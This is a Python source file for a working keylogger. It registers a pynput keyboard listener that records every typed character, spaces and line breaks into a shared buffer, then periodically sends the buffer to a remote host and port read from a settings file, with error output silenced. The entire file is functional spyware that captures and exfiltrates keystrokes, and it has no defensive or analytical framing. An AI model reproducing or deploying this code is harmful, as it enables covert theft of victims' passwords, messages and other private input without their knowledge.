#!/usr/bin/env python3

import asyncio 
import threading
from pynput.keyboard import Listener, Key
from async_data_transfer import AsyncClient
from settings import settings


DATA = ''
data_lock = threading.Lock()


async def send_data() -> None:
    global DATA
    while True:
        try:
            client = AsyncClient(settings['host'], settings['port'])
            await asyncio.sleep(settings['send_timeout'])
            # print('Sending data ... ')
            with data_lock:
                await client.send_data(DATA.encode('utf-8'))
                DATA = ''
        except Exception as ex:
            await asyncio.sleep(1)
            # print(f'An Exception Occured -> {ex}')
            await client.close()
            continue
    
def on_key_press(key) -> None:
    global DATA
    with data_lock:
        if hasattr(key, 'char') and key.char is not None:
            DATA += key.char
        elif key == Key.enter:
            DATA += '\n'
        elif key == Key.space:
            DATA += ' '

def keyboard_listener():
    with Listener(on_press=on_key_press) as listener:
        listener.join()
    
def main():
    kb_listener = threading.Thread(target=keyboard_listener)
    kb_listener.start()
    
    asyncio.run(send_data())

if __name__ == '__main__':
    main()